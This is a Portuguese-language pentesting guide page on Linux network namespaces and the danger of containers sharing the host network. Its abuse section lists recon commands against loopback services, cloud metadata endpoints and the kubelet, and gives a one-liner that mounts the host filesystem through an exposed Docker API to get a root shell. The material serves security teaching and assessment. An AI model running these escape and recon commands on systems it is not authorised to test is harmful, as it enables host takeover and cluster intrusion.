# Namespace de Rede

{{#include ../../../../../banners/hacktricks-training.md}}

## Visão geral

O namespace de rede isola recursos relacionados à rede, como interfaces, endereços IP, tabelas de roteamento, estado ARP/neighbor, regras de firewall, sockets e o conteúdo de arquivos como `/proc/net`. É por isso que um container pode ter algo que parece seu próprio `eth0`, suas próprias rotas locais e seu próprio dispositivo loopback sem possuir a pilha de rede real do host.

Do ponto de vista de segurança, isso importa porque o isolamento de rede é muito mais do que a associação de portas. Um namespace de rede privado limita o que a carga de trabalho pode observar ou reconfigurar diretamente. Uma vez que esse namespace é compartilhado com o host, o container pode, de repente, ganhar visibilidade sobre processos que escutam no host, serviços locais do host e pontos de controle da rede que nunca deveriam ser expostos à aplicação.

## Funcionamento

Um namespace de rede recém-criado começa com um ambiente de rede vazio ou quase vazio até que interfaces sejam anexadas a ele. Runtimes de container então criam ou conectam interfaces virtuais, atribuem endereços e configuram rotas para que a carga de trabalho tenha a conectividade esperada. Em deployments baseados em bridge, isso normalmente significa que o container vê uma interface suportada por veth conectada a uma bridge do host. No Kubernetes, plugins CNI fazem a configuração equivalente para a rede de Pods.

Essa arquitetura explica por que `--network=host` ou `hostNetwork: true` é uma mudança tão drástica. Ao invés de receber uma pilha de rede privada preparada, a carga de trabalho passa a integrar a pilha real do host.

## Laboratório

Você pode ver um namespace de rede quase vazio com:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
E você pode comparar containers normais e containers com rede do host usando:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
O container usando a rede do host não tem mais sua própria visão isolada de sockets e interfaces. Essa mudança por si só já é significativa antes mesmo de você perguntar quais capacidades o processo possui.

## Uso em tempo de execução

Docker e Podman normalmente criam um namespace de rede privado para cada container, salvo configuração em contrário. Kubernetes geralmente dá a cada Pod seu próprio namespace de rede, compartilhado pelos containers dentro desse Pod, mas separado do host. Sistemas Incus/LXC também fornecem isolamento rico baseado em namespace de rede, frequentemente com uma variedade maior de configurações de rede virtual.

O princípio comum é que redes privadas são a fronteira de isolamento padrão, enquanto usar a rede do host é uma exceção explícita a essa fronteira.

## Configurações incorretas

A má configuração mais importante é simplesmente compartilhar o namespace de rede do host. Isso às vezes é feito por desempenho, monitoramento de baixo nível ou conveniência, mas elimina uma das fronteiras mais limpas disponíveis para containers. Listeners locais do host tornam-se alcançáveis de forma mais direta, serviços vinculados apenas ao localhost podem se tornar acessíveis, e capacidades como `CAP_NET_ADMIN` ou `CAP_NET_RAW` tornam-se muito mais perigosas porque as operações que elas habilitam agora são aplicadas ao próprio ambiente de rede do host.

Outro problema é conceder em excesso capacidades relacionadas à rede mesmo quando o namespace de rede é privado. Um namespace privado ajuda, mas não torna raw sockets ou controle avançado de rede inofensivos.

No Kubernetes, `hostNetwork: true` também muda o quanto você pode confiar na segmentação de rede a nível de Pod. O Kubernetes documenta que muitos plugins de rede não conseguem distinguir corretamente o tráfego de Pods com `hostNetwork` para correspondência em `podSelector` / `namespaceSelector` e, portanto, o tratam como tráfego ordinário do node. Do ponto de vista de um atacante, isso significa que uma workload comprometida com `hostNetwork` frequentemente deve ser tratada como um foothold de rede a nível de node, em vez de um Pod normal ainda restrito pelas mesmas suposições de política que workloads de overlay-network.

## Abuso

Em ambientes pouco isolados, atacantes podem inspecionar serviços que escutam no host, alcançar endpoints de gerenciamento vinculados apenas ao loopback, sniffar ou interferir no tráfego dependendo das capacidades e do ambiente exatos, ou reconfigurar roteamento e o estado do firewall se `CAP_NET_ADMIN` estiver presente. Em um cluster, isso também pode facilitar lateral movement e control-plane reconnaissance.

Se você suspeitar do uso da rede do host, comece confirmando que as interfaces e listeners visíveis pertencem ao host em vez de a uma rede de container isolada:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Serviços acessíveis apenas via loopback são frequentemente a primeira descoberta interessante:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Se capacidades de rede estiverem presentes, teste se o workload pode inspecionar ou alterar a pilha visível:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Em kernels modernos, host networking junto com `CAP_NET_ADMIN` também pode expor o caminho dos pacotes além das simples alterações em `iptables` / `nftables`. `tc` qdiscs e filtros também têm escopo de namespace, então, em um namespace de rede do host compartilhado, eles se aplicam às interfaces do host que o container consegue ver. Se `CAP_BPF` estiver presente adicionalmente, programas eBPF relacionados à rede, como carregadores TC e XDP, também se tornam relevantes:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Isto importa porque um atacante pode ser capaz de espelhar, redirecionar, regular ou descartar tráfego ao nível da interface do host, não apenas reescrever regras de firewall. Em um private network namespace essas ações ficam contidas à visão do container; em um shared host namespace elas passam a impactar o host.

Em ambientes de cluster ou nuvem, host networking também justifica quick local recon de metadata e control-plane-adjacent services:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Exemplo Completo: Rede do Host + Runtime Local / Acesso ao Kubelet

A rede do host não fornece automaticamente acesso root no host, mas frequentemente expõe serviços que são intencionalmente acessíveis apenas a partir do próprio nó. Se um desses serviços for pouco protegido, a rede do host torna-se um caminho direto de elevação de privilégios.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet em localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impacto:

- comprometimento direto do host se uma runtime API local for exposta sem proteção adequada
- reconhecimento do cluster ou movimento lateral se o kubelet ou agentes locais estiverem acessíveis
- manipulação de tráfego ou negação de serviço quando combinado com `CAP_NET_ADMIN`

## Verificações

O objetivo dessas verificações é descobrir se o processo possui uma private network stack, quais routes e listeners estão visíveis, e se a network view já se parece com a do host antes mesmo de você testar capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
- Se `/proc/self/ns/net` e `/proc/1/ns/net` já aparentam ser do host, o container pode estar compartilhando o network namespace do host ou outro namespace não-privado.
- `lsns -t net` e `ip netns identify` são úteis quando o shell já está dentro de um namespace nomeado ou persistente e você quer correlacioná-lo com os objetos em `/run/netns` do lado do host.
- `ss -lntup` é especialmente valioso porque revela listeners apenas em loopback e endpoints de gerenciamento locais.
- Rotas, nomes de interface, contexto de firewall, estado de `tc` e anexos eBPF tornam-se muito mais importantes se `CAP_NET_ADMIN`, `CAP_NET_RAW` ou `CAP_BPF` estiverem presentes.
- Em Kubernetes, falha na resolução de nomes de serviço a partir de um Pod com `hostNetwork` pode simplesmente significar que o Pod não está usando `dnsPolicy: ClusterFirstWithHostNet`, e não que o serviço esteja ausente.

Ao revisar um container, avalie sempre o namespace de rede juntamente com o conjunto de capacidades. Networking do host combinado com fortes capacidades de rede é uma postura muito diferente do networking em bridge combinado com um conjunto padrão de capacidades restrito.

## Referências

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
